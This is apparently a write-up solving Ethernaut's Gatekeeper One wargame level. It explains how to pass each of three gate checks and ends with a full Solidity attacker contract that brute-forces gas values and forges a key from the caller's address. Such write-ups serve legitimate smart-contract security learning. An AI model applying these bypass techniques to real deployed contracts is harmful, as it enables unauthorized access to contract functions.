# Ethernaut Level 13: Gatekeeper One Solution

## **Gate Requirements**

### **Gate 1**
```solidity
require(msg.sender != tx.origin);
```
- **Explanation**: The `msg.sender` must not be the same as `tx.origin`. This means you need to call the `enter` function from a smart contract, not directly from an externally owned account (EOA).

- **Solution**: Deploy an attacker contract that interacts with the target contract.

---

### **Gate 2**
```solidity
require(gasleft() % 8191 == 0);
```
- **Explanation**: The remaining gas at the time of executing this check must be a multiple of 8191.

- **Solution**:
  1. I bruteforced the function gas until it fit.


### **Gate 3**
```solidity
require(
    uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)) &&
    uint32(uint64(_gateKey)) != uint64(_gateKey) &&
    uint32(uint64(_gateKey)) == uint16(uint160(msg.sender))
);
```

- **Explanation**:
  1. `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`:
     - The lower 16 bits of `_gateKey` must equal the lower 32 bits of `_gateKey`.
     - 0x B5 B6 B7 B8 == 0x 00 00 B7 B8 This is the first condition

  2. `uint32(uint64(_gateKey)) != uint64(_gateKey)`:
     - The `_gateKey` must not fit within 32 bits, ensuring a higher portion of the key exists.
     - 0x 00 00 00 00 B5 B6 B7 B8 != 0x B1 B2 B3 B4 B5 B6 B7 B8 This is the second condition

  3. `uint32(uint64(_gateKey)) == uint16(uint160(msg.sender))`:
     - The lower 16 bits of `msg.sender` must match the lower 16 bits of `_gateKey`.
     - 0x B5 B6 B7 B8 == 0x 00 00 (last two bytes of tx.origin) This is the third condition

- **Solution**:
    - 0x ANY_DATA ANY_DATA ANY_DATA ANY_DATA 00 00 SECOND_LAST_BYTE_OF_ADDRESS LAST_BYTE_OF_ADDRESS


## **Attacker Contract**
Here’s the full implementation of the attacking contract:

```solidity
contract Attacker {
    GatekeeperOne gatekeeper;
    bytes8 public key1 = bytes8(uint64(uint160(address(msg.sender)))) & 0xFFFFFFFF0000FFFF;

    constructor(address _gate){
        gatekeeper = GatekeeperOne(_gate);
    }

    function exploit() external{
        bytes8 key = bytes8(uint64(uint160(address(msg.sender)))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(gatekeeper).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                break;
            }
        }
    }
}
```


## **Summary**
- Use a contract to bypass Gate 1.
- Bruteforce the gas to satisfy Gate 2.
- Forge a key that satisfies all constraints of Gate 3.

